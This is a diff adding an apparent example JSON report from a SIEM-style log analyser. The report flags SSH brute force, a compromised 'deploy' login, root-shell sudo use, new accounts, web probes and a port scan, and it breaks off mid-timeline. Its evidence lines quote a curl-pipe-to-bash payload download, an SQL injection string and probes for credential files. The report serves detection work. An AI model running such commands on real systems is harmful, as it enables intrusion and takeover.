@@ -1,0 +1,1099 @@
+{
+  "meta": {
+    "tool": "logwatch-siem",
+    "generated": "2026-09-24T06:11:10+00:00",
+    "targets": [
+      "/home/user/logwatch-siem/examples/logs"
+    ],
+    "elapsed_seconds": 0.012
+  },
+  "summary": {
+    "lines_read": 176,
+    "events_parsed": 176,
+    "lines_unparsed": 0,
+    "per_format": {
+      "web": 94,
+      "auth": 60,
+      "syslog": 22
+    },
+    "per_kind": {
+      "http_request": 80,
+      "ssh_failed": 33,
+      "firewall_drop": 22,
+      "ssh_invalid_user": 15,
+      "web_login_failed": 14,
+      "sudo_command": 4,
+      "ssh_accepted": 2,
+      "ssh_max_attempts": 1,
+      "unknown": 1,
+      "new_user": 1,
+      "password_changed": 1,
+      "new_group": 1,
+      "su_failed": 1
+    },
+    "source_files": {
+      "examples/logs/access.log": 94,
+      "examples/logs/auth.log": 60,
+      "examples/logs/kern.log": 22
+    },
+    "first_event": "2026-09-18T02:00:00",
+    "last_event": "2026-09-18T02:55:12",
+    "window_minutes": 55.2,
+    "auth_failures": 64,
+    "auth_successes": 2,
+    "unique_ips": 9,
+    "alerts": 18,
+    "by_severity": {
+      "critical": 1,
+      "high": 10,
+      "medium": 6,
+      "low": 1
+    },
+    "total_score": 367,
+    "top_ips": [
+      {
+        "ip": "203.0.113.45",
+        "events": 40
+      },
+      {
+        "ip": "198.51.100.5",
+        "events": 25
+      },
+      {
+        "ip": "203.0.113.90",
+        "events": 24
+      },
+      {
+        "ip": "192.0.2.200",
+        "events": 22
+      },
+      {
+        "ip": "198.51.100.20",
+        "events": 16
+      },
+      {
+        "ip": "203.0.113.12",
+        "events": 15
+      },
+      {
+        "ip": "198.51.100.34",
+        "events": 14
+      },
+      {
+        "ip": "198.51.100.77",
+        "events": 10
+      },
+      {
+        "ip": "192.168.1.10",
+        "events": 1
+      }
+    ],
+    "attacker_ips": [
+      {
+        "ip": "203.0.113.45",
+        "alerts": 3
+      },
+      {
+        "ip": "198.51.100.77",
+        "alerts": 2
+      },
+      {
+        "ip": "203.0.113.90",
+        "alerts": 2
+      },
+      {
+        "ip": "198.51.100.5",
+        "alerts": 2
+      },
+      {
+        "ip": "192.168.1.10",
+        "alerts": 1
+      },
+      {
+        "ip": "192.0.2.200",
+        "alerts": 1
+      }
+    ],
+    "max_severity": "critical"
+  },
+  "verdict": "compromised",
+  "alerts": [
+    {
+      "rule": "successful_login_after_failures",
+      "title": "Successful SSH login after repeated failures",
+      "severity": "critical",
+      "score": 40,
+      "summary": "'deploy' logged in successfully from 203.0.113.45 immediately after 39 failed attempts \u2014 credentials may be compromised. Authentication method: password. Previously targeted accounts: admin, deploy, oracle, postgres, root, test",
+      "ip": "203.0.113.45",
+      "user": "deploy",
+      "count": 40,
+      "mitre": "T1078 (Valid Accounts)",
+      "first_seen": "2026-09-18T02:00:00",
+      "last_seen": "2026-09-18T02:01:52",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:01:19",
+          "kind": "ssh_failed",
+          "ip": "203.0.113.45",
+          "user": "admin",
+          "detail": "failed password for 'admin'",
+          "raw": "Sep 18 02:01:19 web-srv-01 sshd[20481]: Failed password for admin from 203.0.113.45 port 58769 ssh2"
+        },
+        {
+          "timestamp": "2026-09-18T02:01:21",
+          "kind": "ssh_failed",
+          "ip": "203.0.113.45",
+          "user": "vinay",
+          "detail": "failed password for 'vinay'",
+          "raw": "Sep 18 02:01:21 web-srv-01 sshd[20481]: Failed password for vinay from 203.0.113.45 port 41791 ssh2"
+        },
+        {
+          "timestamp": "2026-09-18T02:01:25",
+          "kind": "ssh_failed",
+          "ip": "203.0.113.45",
+          "user": "admin",
+          "detail": "failed password for 'admin'",
+          "raw": "Sep 18 02:01:25 web-srv-01 sshd[20481]: Failed password for admin from 203.0.113.45 port 49530 ssh2"
+        },
+        {
+          "timestamp": "2026-09-18T02:01:28",
+          "kind": "ssh_failed",
+          "ip": "203.0.113.45",
+          "user": "deploy",
+          "detail": "failed password for 'deploy'",
+          "raw": "Sep 18 02:01:28 web-srv-01 sshd[20481]: Failed password for deploy from 203.0.113.45 port 49608 ssh2"
+        },
+        {
+          "timestamp": "2026-09-18T02:01:31",
+          "kind": "ssh_failed",
+          "ip": "203.0.113.45",
+          "user": "admin",
+          "detail": "failed password for 'admin'",
+          "raw": "Sep 18 02:01:31 web-srv-01 sshd[20481]: Failed password for admin from 203.0.113.45 port 54120 ssh2"
+        }
+      ]
+    },
+    {
+      "rule": "ssh_brute_force",
+      "title": "SSH brute-force attack",
+      "severity": "high",
+      "score": 25,
+      "summary": "8 failed SSH logins from 203.0.113.45 in 23s, targeting 7 username(s): admin, oracle, postgres, root, test (+2 more)",
+      "ip": "203.0.113.45",
+      "user": null,
+      "count": 8,
+      "mitre": "T1110.001 (Brute Force: Password Guessing)",
+      "first_seen": "2026-09-18T02:00:00",
+      "last_seen": "2026-09-18T02:00:23",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:00:00",
+          "kind": "ssh_invalid_user",
+          "ip": "203.0.113.45",
+          "user": "admin",
+          "detail": "invalid user 'admin'",
+          "raw": "Sep 18 02:00:00 web-srv-01 sshd[20481]: Invalid user admin from 203.0.113.45 port 50094"
+        },
+        {
+          "timestamp": "2026-09-18T02:00:03",
+          "kind": "ssh_invalid_user",
+          "ip": "203.0.113.45",
+          "user": "test",
+          "detail": "invalid user 'test'",
+          "raw": "Sep 18 02:00:03 web-srv-01 sshd[20481]: Invalid user test from 203.0.113.45 port 41653"
+        },
+        {
+          "timestamp": "2026-09-18T02:00:09",
+          "kind": "ssh_invalid_user",
+          "ip": "203.0.113.45",
+          "user": "oracle",
+          "detail": "invalid user 'oracle'",
+          "raw": "Sep 18 02:00:09 web-srv-01 sshd[20481]: Invalid user oracle from 203.0.113.45 port 54129"
+        },
+        {
+          "timestamp": "2026-09-18T02:00:13",
+          "kind": "ssh_invalid_user",
+          "ip": "203.0.113.45",
+          "user": "postgres",
+          "detail": "invalid user 'postgres'",
+          "raw": "Sep 18 02:00:13 web-srv-01 sshd[20481]: Invalid user postgres from 203.0.113.45 port 50659"
+        },
+        {
+          "timestamp": "2026-09-18T02:00:16",
+          "kind": "ssh_invalid_user",
+          "ip": "203.0.113.45",
+          "user": "ubuntu",
+          "detail": "invalid user 'ubuntu'",
+          "raw": "Sep 18 02:00:16 web-srv-01 sshd[20481]: Invalid user ubuntu from 203.0.113.45 port 51734"
+        }
+      ]
+    },
+    {
+      "rule": "suspicious_sudo",
+      "title": "Suspicious privilege escalation",
+      "severity": "high",
+      "score": 25,
+      "summary": "'deploy' used sudo to run a command that spawned an interactive root shell: /bin/bash",
+      "ip": null,
+      "user": "deploy",
+      "count": 1,
+      "mitre": "T1548.003 (Sudo and Sudo Caching)",
+      "first_seen": "2026-09-18T02:04:52",
+      "last_seen": "2026-09-18T02:04:52",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:04:52",
+          "kind": "sudo_command",
+          "ip": null,
+          "user": "deploy",
+          "detail": "sudo \u2192 root: /bin/bash",
+          "raw": "Sep 18 02:04:52 web-srv-01 sudo:   deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash"
+        }
+      ]
+    },
+    {
+      "rule": "ssh_brute_force",
+      "title": "SSH brute-force attack",
+      "severity": "high",
+      "score": 25,
+      "summary": "8 failed SSH logins from 198.51.100.77 in 12s, targeting 8 username(s): elastic, gitlab, grafana, hadoop, jenkins (+3 more)",
+      "ip": "198.51.100.77",
+      "user": null,
+      "count": 8,
+      "mitre": "T1110.001 (Brute Force: Password Guessing)",
+      "first_seen": "2026-09-18T02:25:00",
+      "last_seen": "2026-09-18T02:25:12",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:25:00",
+          "kind": "ssh_invalid_user",
+          "ip": "198.51.100.77",
+          "user": "jenkins",
+          "detail": "invalid user 'jenkins'",
+          "raw": "Sep 18 02:25:00 web-srv-01 sshd[23110]: Invalid user jenkins from 198.51.100.77 port 45337"
+        },
+        {
+          "timestamp": "2026-09-18T02:25:01",
+          "kind": "ssh_invalid_user",
+          "ip": "198.51.100.77",
+          "user": "gitlab",
+          "detail": "invalid user 'gitlab'",
+          "raw": "Sep 18 02:25:01 web-srv-01 sshd[23110]: Invalid user gitlab from 198.51.100.77 port 53819"
+        },
+        {
+          "timestamp": "2026-09-18T02:25:02",
+          "kind": "ssh_invalid_user",
+          "ip": "198.51.100.77",
+          "user": "hadoop",
+          "detail": "invalid user 'hadoop'",
+          "raw": "Sep 18 02:25:02 web-srv-01 sshd[23110]: Invalid user hadoop from 198.51.100.77 port 40579"
+        },
+        {
+          "timestamp": "2026-09-18T02:25:05",
+          "kind": "ssh_invalid_user",
+          "ip": "198.51.100.77",
+          "user": "spark",
+          "detail": "invalid user 'spark'",
+          "raw": "Sep 18 02:25:05 web-srv-01 sshd[23110]: Invalid user spark from 198.51.100.77 port 41913"
+        },
+        {
+          "timestamp": "2026-09-18T02:25:08",
+          "kind": "ssh_invalid_user",
+          "ip": "198.51.100.77",
+          "user": "kafka",
+          "detail": "invalid user 'kafka'",
+          "raw": "Sep 18 02:25:08 web-srv-01 sshd[23110]: Invalid user kafka from 198.51.100.77 port 47958"
+        }
+      ]
+    },
+    {
+      "rule": "web_attack_probe",
+      "title": "Web application attack probe",
+      "severity": "high",
+      "score": 25,
+      "summary": "1 malicious request(s) \u2014 SQL injection probe, known-vulnerable endpoint probe \u2014 scanner identified: sqlmap. Latest: GET /admin.php?id=1%27%20OR%20%271%27=%271",
+      "ip": "203.0.113.90",
+      "user": null,
+      "count": 1,
+      "mitre": "T1190 (Exploit Public-Facing Application)",
+      "first_seen": "2026-09-18T02:30:00",
+      "last_seen": "2026-09-18T02:30:00",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:30:00",
+          "kind": "http_request",
+          "ip": "203.0.113.90",
+          "user": null,
+          "detail": "GET /admin.php?id=1%27%20OR%20%271%27=%271 \u2192 200",
+          "raw": "203.0.113.90 - - [18/Sep/2026:02:30:00 +0000] \"GET /admin.php?id=1%27%20OR%20%271%27=%271 HTTP/1.1\" 200 2804 \"-\" \"sqlmap/1.7#stable (http://sqlmap.org)\""
+        }
+      ]
+    },
+    {
+      "rule": "web_attack_probe",
+      "title": "Web application attack probe",
+      "severity": "high",
+      "score": 25,
+      "summary": "1 malicious request(s) \u2014 scanner identified: gobuster. Latest: GET /api/v1/users",
+      "ip": "198.51.100.5",
+      "user": null,
+      "count": 1,
+      "mitre": "T1190 (Exploit Public-Facing Application)",
+      "first_seen": "2026-09-18T02:35:00",
+      "last_seen": "2026-09-18T02:35:00",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:35:00",
+          "kind": "http_request",
+          "ip": "198.51.100.5",
+          "user": null,
+          "detail": "GET /api/v1/users \u2192 404",
+          "raw": "198.51.100.5 - - [18/Sep/2026:02:35:00 +0000] \"GET /api/v1/users HTTP/1.1\" 404 153 \"-\" \"gobuster/3.6\""
+        }
+      ]
+    },
+    {
+      "rule": "root_login",
+      "title": "Direct root login",
+      "severity": "high",
+      "score": 25,
+      "summary": "root logged in directly from 192.168.1.10 \u2014 direct root SSH should be disabled",
+      "ip": "192.168.1.10",
+      "user": "root",
+      "count": 1,
+      "mitre": "T1078.003 (Local Accounts)",
+      "first_seen": "2026-09-18T02:40:00",
+      "last_seen": "2026-09-18T02:40:00",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:40:00",
+          "kind": "ssh_accepted",
+          "ip": "192.168.1.10",
+          "user": "root",
+          "detail": "accepted publickey for 'root'",
+          "raw": "Sep 18 02:40:00 web-srv-01 sshd[24001]: Accepted publickey for root from 192.168.1.10 port 44001 ssh2"
+        }
+      ]
+    },
+    {
+      "rule": "suspicious_sudo",
+      "title": "Suspicious privilege escalation",
+      "severity": "high",
+      "score": 25,
+      "summary": "'vinay' used sudo to run a command that edited the sudoers file: /usr/bin/visudo",
+      "ip": null,
+      "user": "vinay",
+      "count": 1,
+      "mitre": "T1548.003 (Sudo and Sudo Caching)",
+      "first_seen": "2026-09-18T02:42:00",
+      "last_seen": "2026-09-18T02:42:00",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:42:00",
+          "kind": "sudo_command",
+          "ip": null,
+          "user": "vinay",
+          "detail": "sudo \u2192 root: /usr/bin/visudo",
+          "raw": "Sep 18 02:42:00 web-srv-01 sudo:   vinay : TTY=pts/0 ; PWD=/home/vinay ; USER=root ; COMMAND=/usr/bin/visudo"
+        }
+      ]
+    },
+    {
+      "rule": "web_login_brute_force",
+      "title": "Web login brute-force",
+      "severity": "high",
+      "score": 25,
+      "summary": "10 failed web logins from 203.0.113.90 against /admin/login",
+      "ip": "203.0.113.90",
+      "user": null,
+      "count": 10,
+      "mitre": "T1110.001 (Brute Force: Password Guessing)",
+      "first_seen": "2026-09-18T02:42:00",
+      "last_seen": "2026-09-18T02:42:23",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:42:06",
+          "kind": "web_login_failed",
+          "ip": "203.0.113.90",
+          "user": null,
+          "detail": "failed login attempt on /admin/login (401)",
+          "raw": "203.0.113.90 - - [18/Sep/2026:02:42:06 +0000] \"POST /admin/login HTTP/1.1\" 401 245 \"-\" \"python-requests/2.31\""
+        },
+        {
+          "timestamp": "2026-09-18T02:42:09",
+          "kind": "web_login_failed",
+          "ip": "203.0.113.90",
+          "user": null,
+          "detail": "failed login attempt on /admin/login (401)",
+          "raw": "203.0.113.90 - - [18/Sep/2026:02:42:09 +0000] \"POST /admin/login HTTP/1.1\" 401 245 \"-\" \"python-requests/2.31\""
+        },
+        {
+          "timestamp": "2026-09-18T02:42:12",
+          "kind": "web_login_failed",
+          "ip": "203.0.113.90",
+          "user": null,
+          "detail": "failed login attempt on /admin/login (401)",
+          "raw": "203.0.113.90 - - [18/Sep/2026:02:42:12 +0000] \"POST /admin/login HTTP/1.1\" 401 245 \"-\" \"python-requests/2.31\""
+        },
+        {
+          "timestamp": "2026-09-18T02:42:14",
+          "kind": "web_login_failed",
+          "ip": "203.0.113.90",
+          "user": null,
+          "detail": "failed login attempt on /admin/login (401)",
+          "raw": "203.0.113.90 - - [18/Sep/2026:02:42:14 +0000] \"POST /admin/login HTTP/1.1\" 401 245 \"-\" \"python-requests/2.31\""
+        },
+        {
+          "timestamp": "2026-09-18T02:42:15",
+          "kind": "web_login_failed",
+          "ip": "203.0.113.90",
+          "user": null,
+          "detail": "failed login attempt on /admin/login (401)",
+          "raw": "203.0.113.90 - - [18/Sep/2026:02:42:15 +0000] \"POST /admin/login HTTP/1.1\" 401 245 \"-\" \"python-requests/2.31\""
+        }
+      ]
+    },
+    {
+      "rule": "suspicious_sudo",
+      "title": "Suspicious privilege escalation",
+      "severity": "high",
+      "score": 25,
+      "summary": "'vinay' used sudo to run a command that made files world-writable or setuid: /bin/chmod 777 /var/www/html",
+      "ip": null,
+      "user": "vinay",
+      "count": 1,
+      "mitre": "T1548.003 (Sudo and Sudo Caching)",
+      "first_seen": "2026-09-18T02:43:00",
+      "last_seen": "2026-09-18T02:43:00",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:43:00",
+          "kind": "sudo_command",
+          "ip": null,
+          "user": "vinay",
+          "detail": "sudo \u2192 root: /bin/chmod 777 /var/www/html",
+          "raw": "Sep 18 02:43:00 web-srv-01 sudo:   vinay : TTY=pts/0 ; PWD=/home/vinay ; USER=root ; COMMAND=/bin/chmod 777 /var/www/html"
+        }
+      ]
+    },
+    {
+      "rule": "suspicious_sudo",
+      "title": "Suspicious privilege escalation",
+      "severity": "high",
+      "score": 25,
+      "summary": "'vinay' used sudo to run a command that spawned an interactive root shell: /usr/bin/curl http://203.0.113.45/payload.sh | /bin/bash",
+      "ip": null,
+      "user": "vinay",
+      "count": 1,
+      "mitre": "T1548.003 (Sudo and Sudo Caching)",
+      "first_seen": "2026-09-18T02:44:00",
+      "last_seen": "2026-09-18T02:44:00",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:44:00",
+          "kind": "sudo_command",
+          "ip": null,
+          "user": "vinay",
+          "detail": "sudo \u2192 root: /usr/bin/curl http://203.0.113.45/payload.sh | /bin/bash",
+          "raw": "Sep 18 02:44:00 web-srv-01 sudo:   vinay : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl http://203.0.113.45/payload.sh | /bin/bash"
+        }
+      ]
+    },
+    {
+      "rule": "user_enumeration",
+      "title": "Username enumeration",
+      "severity": "medium",
+      "score": 12,
+      "summary": "5 distinct nonexistent usernames probed from 203.0.113.45: admin, oracle, postgres, test, ubuntu",
+      "ip": "203.0.113.45",
+      "user": null,
+      "count": 5,
+      "mitre": "T1087 (Account Discovery)",
+      "first_seen": "2026-09-18T02:00:00",
+      "last_seen": "2026-09-18T02:00:16",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:00:00",
+          "kind": "ssh_invalid_user",
+          "ip": "203.0.113.45",
+          "user": "admin",
+          "detail": "invalid user 'admin'",
+          "raw": "Sep 18 02:00:00 web-srv-01 sshd[20481]: Invalid user admin from 203.0.113.45 port 50094"
+        },
+        {
+          "timestamp": "2026-09-18T02:00:03",
+          "kind": "ssh_invalid_user",
+          "ip": "203.0.113.45",
+          "user": "test",
+          "detail": "invalid user 'test'",
+          "raw": "Sep 18 02:00:03 web-srv-01 sshd[20481]: Invalid user test from 203.0.113.45 port 41653"
+        },
+        {
+          "timestamp": "2026-09-18T02:00:09",
+          "kind": "ssh_invalid_user",
+          "ip": "203.0.113.45",
+          "user": "oracle",
+          "detail": "invalid user 'oracle'",
+          "raw": "Sep 18 02:00:09 web-srv-01 sshd[20481]: Invalid user oracle from 203.0.113.45 port 54129"
+        },
+        {
+          "timestamp": "2026-09-18T02:00:13",
+          "kind": "ssh_invalid_user",
+          "ip": "203.0.113.45",
+          "user": "postgres",
+          "detail": "invalid user 'postgres'",
+          "raw": "Sep 18 02:00:13 web-srv-01 sshd[20481]: Invalid user postgres from 203.0.113.45 port 50659"
+        },
+        {
+          "timestamp": "2026-09-18T02:00:16",
+          "kind": "ssh_invalid_user",
+          "ip": "203.0.113.45",
+          "user": "ubuntu",
+          "detail": "invalid user 'ubuntu'",
+          "raw": "Sep 18 02:00:16 web-srv-01 sshd[20481]: Invalid user ubuntu from 203.0.113.45 port 51734"
+        }
+      ]
+    },
+    {
+      "rule": "account_created",
+      "title": "New user account created",
+      "severity": "medium",
+      "score": 12,
+      "summary": "new user: 'backupsvc' \u2014 verify this was authorised",
+      "ip": null,
+      "user": "backupsvc",
+      "count": 1,
+      "mitre": "T1136.001 (Create Account: Local Account)",
+      "first_seen": "2026-09-18T02:05:52",
+      "last_seen": "2026-09-18T02:05:52",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:05:52",
+          "kind": "new_user",
+          "ip": null,
+          "user": "backupsvc",
+          "detail": "account created: 'backupsvc'",
+          "raw": "Sep 18 02:05:52 web-srv-01 useradd[21993]: new user: name=backupsvc, UID=1002, GID=1002, home=/home/backupsvc, shell=/bin/bash"
+        }
+      ]
+    },
+    {
+      "rule": "account_created",
+      "title": "New user account created",
+      "severity": "medium",
+      "score": 12,
+      "summary": "new group: 'svcops' \u2014 verify this was authorised",
+      "ip": null,
+      "user": "svcops",
+      "count": 1,
+      "mitre": "T1136.001 (Create Account: Local Account)",
+      "first_seen": "2026-09-18T02:06:42",
+      "last_seen": "2026-09-18T02:06:42",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:06:42",
+          "kind": "new_group",
+          "ip": null,
+          "user": "svcops",
+          "detail": "group created: 'svcops'",
+          "raw": "Sep 18 02:06:42 web-srv-01 useradd[22015]: new group: name=svcops, GID=1003"
+        }
+      ]
+    },
+    {
+      "rule": "user_enumeration",
+      "title": "Username enumeration",
+      "severity": "medium",
+      "score": 12,
+      "summary": "5 distinct nonexistent usernames probed from 198.51.100.77: gitlab, hadoop, jenkins, kafka, spark",
+      "ip": "198.51.100.77",
+      "user": null,
+      "count": 5,
+      "mitre": "T1087 (Account Discovery)",
+      "first_seen": "2026-09-18T02:25:00",
+      "last_seen": "2026-09-18T02:25:08",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:25:00",
+          "kind": "ssh_invalid_user",
+          "ip": "198.51.100.77",
+          "user": "jenkins",
+          "detail": "invalid user 'jenkins'",
+          "raw": "Sep 18 02:25:00 web-srv-01 sshd[23110]: Invalid user jenkins from 198.51.100.77 port 45337"
+        },
+        {
+          "timestamp": "2026-09-18T02:25:01",
+          "kind": "ssh_invalid_user",
+          "ip": "198.51.100.77",
+          "user": "gitlab",
+          "detail": "invalid user 'gitlab'",
+          "raw": "Sep 18 02:25:01 web-srv-01 sshd[23110]: Invalid user gitlab from 198.51.100.77 port 53819"
+        },
+        {
+          "timestamp": "2026-09-18T02:25:02",
+          "kind": "ssh_invalid_user",
+          "ip": "198.51.100.77",
+          "user": "hadoop",
+          "detail": "invalid user 'hadoop'",
+          "raw": "Sep 18 02:25:02 web-srv-01 sshd[23110]: Invalid user hadoop from 198.51.100.77 port 40579"
+        },
+        {
+          "timestamp": "2026-09-18T02:25:05",
+          "kind": "ssh_invalid_user",
+          "ip": "198.51.100.77",
+          "user": "spark",
+          "detail": "invalid user 'spark'",
+          "raw": "Sep 18 02:25:05 web-srv-01 sshd[23110]: Invalid user spark from 198.51.100.77 port 41913"
+        },
+        {
+          "timestamp": "2026-09-18T02:25:08",
+          "kind": "ssh_invalid_user",
+          "ip": "198.51.100.77",
+          "user": "kafka",
+          "detail": "invalid user 'kafka'",
+          "raw": "Sep 18 02:25:08 web-srv-01 sshd[23110]: Invalid user kafka from 198.51.100.77 port 47958"
+        }
+      ]
+    },
+    {
+      "rule": "directory_scanning",
+      "title": "Directory brute-force scanning",
+      "severity": "medium",
+      "score": 12,
+      "summary": "20 requests for nonexistent paths from 198.51.100.5 \u2014 automated content discovery. Recent: /config.json, /secrets.yml, /.htpasswd, /server-status",
+      "ip": "198.51.100.5",
+      "user": null,
+      "count": 20,
+      "mitre": "T1083 (File and Directory Discovery)",
+      "first_seen": "2026-09-18T02:35:00",
+      "last_seen": "2026-09-18T02:35:09",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:35:05",
+          "kind": "http_request",
+          "ip": "198.51.100.5",
+          "user": null,
+          "detail": "GET /.htpasswd \u2192 404",
+          "raw": "198.51.100.5 - - [18/Sep/2026:02:35:05 +0000] \"GET /.htpasswd HTTP/1.1\" 404 153 \"-\" \"gobuster/3.6\""
+        },
+        {
+          "timestamp": "2026-09-18T02:35:06",
+          "kind": "http_request",
+          "ip": "198.51.100.5",
+          "user": null,
+          "detail": "GET /server-status \u2192 404",
+          "raw": "198.51.100.5 - - [18/Sep/2026:02:35:06 +0000] \"GET /server-status HTTP/1.1\" 404 153 \"-\" \"gobuster/3.6\""
+        },
+        {
+          "timestamp": "2026-09-18T02:35:06",
+          "kind": "http_request",
+          "ip": "198.51.100.5",
+          "user": null,
+          "detail": "GET /.aws/credentials \u2192 404",
+          "raw": "198.51.100.5 - - [18/Sep/2026:02:35:06 +0000] \"GET /.aws/credentials HTTP/1.1\" 404 153 \"-\" \"gobuster/3.6\""
+        },
+        {
+          "timestamp": "2026-09-18T02:35:07",
+          "kind": "http_request",
+          "ip": "198.51.100.5",
+          "user": null,
+          "detail": "GET /.ssh/id_rsa \u2192 404",
+          "raw": "198.51.100.5 - - [18/Sep/2026:02:35:07 +0000] \"GET /.ssh/id_rsa HTTP/1.1\" 404 153 \"-\" \"gobuster/3.6\""
+        },
+        {
+          "timestamp": "2026-09-18T02:35:07",
+          "kind": "http_request",
+          "ip": "198.51.100.5",
+          "user": null,
+          "detail": "GET /wp-config.php \u2192 404",
+          "raw": "198.51.100.5 - - [18/Sep/2026:02:35:07 +0000] \"GET /wp-config.php HTTP/1.1\" 404 153 \"-\" \"gobuster/3.6\""
+        }
+      ]
+    },
+    {
+      "rule": "port_scan_by_drops",
+      "title": "Port scan inferred from firewall drops",
+      "severity": "medium",
+      "score": 12,
+      "summary": "192.0.2.200 probed 15 distinct ports in 8s \u2014 ports 21\u201327017",
+      "ip": "192.0.2.200",
+      "user": null,
+      "count": 15,
+      "mitre": "T1046 (Network Service Discovery)",
+      "first_seen": "2026-09-18T02:55:00",
+      "last_seen": "2026-09-18T02:55:08",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:55:04",
+          "kind": "firewall_drop",
+          "ip": "192.0.2.200",
+          "user": null,
+          "detail": "blocked TCP to port 445 (dst 10.0.0.5)",
+          "raw": "Sep 18 02:55:04 web-srv-01 kernel: [48213.551] IPTABLES DROP IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC=192.0.2.200 DST=10.0.0.5 LEN=44 PROTO=TCP DPT=445"
+        },
+        {
+          "timestamp": "2026-09-18T02:55:04",
+          "kind": "firewall_drop",
+          "ip": "192.0.2.200",
+          "user": null,
+          "detail": "blocked TCP to port 3389 (dst 10.0.0.5)",
+          "raw": "Sep 18 02:55:04 web-srv-01 kernel: [48213.551] IPTABLES DROP IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC=192.0.2.200 DST=10.0.0.5 LEN=44 PROTO=TCP DPT=3389"
+        },
+        {
+          "timestamp": "2026-09-18T02:55:05",
+          "kind": "firewall_drop",
+          "ip": "192.0.2.200",
+          "user": null,
+          "detail": "blocked TCP to port 80 (dst 10.0.0.5)",
+          "raw": "Sep 18 02:55:05 web-srv-01 kernel: [48213.551] IPTABLES DROP IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC=192.0.2.200 DST=10.0.0.5 LEN=44 PROTO=TCP DPT=80"
+        },
+        {
+          "timestamp": "2026-09-18T02:55:06",
+          "kind": "firewall_drop",
+          "ip": "192.0.2.200",
+          "user": null,
+          "detail": "blocked TCP to port 135 (dst 10.0.0.5)",
+          "raw": "Sep 18 02:55:06 web-srv-01 kernel: [48213.551] IPTABLES DROP IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC=192.0.2.200 DST=10.0.0.5 LEN=44 PROTO=TCP DPT=135"
+        },
+        {
+          "timestamp": "2026-09-18T02:55:06",
+          "kind": "firewall_drop",
+          "ip": "192.0.2.200",
+          "user": null,
+          "detail": "blocked TCP to port 6379 (dst 10.0.0.5)",
+          "raw": "Sep 18 02:55:06 web-srv-01 kernel: [48213.551] IPTABLES DROP IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC=192.0.2.200 DST=10.0.0.5 LEN=44 PROTO=TCP DPT=6379"
+        }
+      ]
+    },
+    {
+      "rule": "password_changed",
+      "title": "Account password changed",
+      "severity": "low",
+      "score": 5,
+      "summary": "password or account settings changed for 'backupsvc'",
+      "ip": null,
+      "user": "backupsvc",
+      "count": 1,
+      "mitre": "T1098 (Account Manipulation)",
+      "first_seen": "2026-09-18T02:06:22",
+      "last_seen": "2026-09-18T02:06:22",
+      "evidence": [
+        {
+          "timestamp": "2026-09-18T02:06:22",
+          "kind": "password_changed",
+          "ip": null,
+          "user": "backupsvc",
+          "detail": "password changed for 'backupsvc'",
+          "raw": "Sep 18 02:06:22 web-srv-01 passwd[22001]: pam_unix(passwd:chauthtok): password changed for backupsvc"
+        }
+      ]
+    }
+  ],
+  "timeline": [
+    {
+      "t": "2026-09-18T02:00:00+00:00",
+      "count": 22,
+      "failures": 22
+    },
+    {
+      "t": "2026-09-18T02:00:55.200000+00:00",
+      "count": 17,
+      "failures": 17
+    },
+    {
+      "t": "2026-09-18T02:01:50.400000+00:00",
+      "count": 2,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:02:45.600000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:03:40.800000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:04:36+00:00",
+      "count": 1,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:05:31.200000+00:00",
+      "count": 2,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:06:26.400000+00:00",
+      "count": 1,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:07:21.600000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:08:16.800000+00:00",
+      "count": 0,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:09:12+00:00",
+      "count": 1,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:10:07.200000+00:00",
+      "count": 2,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:11:02.400000+00:00",
+      "count": 3,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:11:57.600000+00:00",
+      "count": 1,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:12:52.800000+00:00",
+      "count": 2,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:13:48+00:00",
+      "count": 2,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:14:43.200000+00:00",
+      "count": 2,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:15:38.400000+00:00",
+      "count": 4,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:16:33.600000+00:00",
+      "count": 3,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:17:28.800000+00:00",
+      "count": 2,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:18:24+00:00",
+      "count": 2,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:19:19.200000+00:00",
+      "count": 1,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:20:14.400000+00:00",
+      "count": 3,
+      "failures": 0
+    },
+    {
+      "t": "2026-09-18T02:21:09.600000+00:00",
